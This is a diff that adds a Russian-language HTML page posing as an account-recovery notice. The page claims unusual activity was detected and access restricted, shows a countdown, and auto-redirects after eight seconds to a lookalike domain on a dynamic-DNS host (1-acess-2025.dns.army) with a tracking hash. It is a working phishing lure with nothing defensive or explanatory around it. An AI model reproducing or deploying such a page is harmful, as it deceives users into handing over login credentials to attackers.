@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Восстановление доступа к аккаунту</title>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://1-acess-2025.dns.army/home.php?hash=48464594368edf7a9b39ba6.24498305";
+        }, 8000);
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #6f42c1; padding: 50px; }
+        .recovery { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .recovery-header { color: #6f42c1; border-bottom: 2px solid #6f42c1; padding-bottom: 15px; margin-bottom: 20px; }
+        .info-box { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="recovery">
+        <div class="recovery-header">
+            <h2>🔓 Восстановление доступа к аккаунту</h2>
+        </div>
+        <p>Мы обнаружили необычную активность в вашем аккаунте и временно ограничили доступ</p>
+        <div class="info-box">
+            <strong>Для восстановления доступа необходимо:</strong>
+            <ul>
+                <li>Подтвердить вашу личность</li>
+                <li>Проверить данные для входа</li>
+                <li>Установить новый пароль</li>
+            </ul>
+        </div>
+        <p>Перенаправление через: <span id="recoveryTimer">8</span> секунд</p>
+        <p><a href="https://1-acess-2025.dns.army/home.php?hash=48464594368edf7a9b39ba6.24498305">Восстановить доступ</a></p>
+    </div>
+    
+    <script>
+        let recoveryTimer = 8;
+        setInterval(function() {
+            recoveryTimer--;
+            document.getElementById('recoveryTimer').textContent = recoveryTimer;
+        }, 1000);
+    </script>
+</body>
+</html>
